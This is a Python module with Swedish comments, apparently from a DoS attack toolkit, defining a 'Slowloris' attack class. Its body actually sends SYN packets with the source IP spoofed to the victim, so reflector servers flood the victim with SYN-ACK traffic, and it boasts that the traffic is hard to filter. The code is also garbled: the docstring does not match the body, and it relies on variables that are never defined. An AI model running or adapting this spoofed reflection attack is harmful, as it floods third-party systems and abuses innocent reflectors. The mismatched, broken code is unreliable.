"""
Slowloris Attack - Slow HTTP DoS
Håller HTTP-connections öppna genom partiella requests
"""
from scapy.all import IP, TCP, Raw
import time
import random
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip, generate_random_port


class SlowlorisAttack(BaseAttack):
    """Slowloris - Långsam HTTP attack som håller connections öppna"""

    def get_attack_name(self):
        return "Slowloris Attack"

    def execute(self, count=100, delay=0.1):
        """
        Kör Slowloris attack
        delay: Fördröjning mellan paket (sekunder) för att simulera långsam sending
        """
        self.print_header("Slowloris Attack (Slow HTTP)", port=80, count=count)

        print("[*] Slowloris håller HTTP-connections öppna med partiella requests")
        print(f"[*] Delay mellan headers: {delay}s")

        self.start_time = time.time()
        self.packets_sent = 0

        # Skapa flera "connections" med partiella HTTP requests
        connections = []
        for i in range(count):
            reflection_target = reflection_targets[i % len(reflection_targets)]
            target_port = common_ports[i % len(common_ports)]

            payload = f"{self.custom_message}_SYNACK_REFL_{i + 1}".encode()

            # Source spoofad till victim - reflector svarar till victim!
            packet = IP(src=self.target_ip, dst=reflection_target) / \
                     TCP(sport=random.randint(1024, 65535), dport=target_port,
                         flags="S",  # SYN
                         seq=random.randint(1000, 9000)) / \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] SYN-ACK Refl: {i + 1}/{count} SYN skickade ({pps:.1f} pps)")
                print(f"    → {len(reflection_targets)} servrar svarar med SYN-ACK till {self.target_ip}")

        self.log_attack("SYNACK_REFLECTION",
                        f"{count} reflected SYN packets, target: {self.target_ip}, reflectors: {len(reflection_targets)}")
        self.print_summary()

        print("\n[!] Varje reflection-server skickar SYN-ACK till victim")
        print("[!] Svår att filtrera - ser ut som legitim trafik")

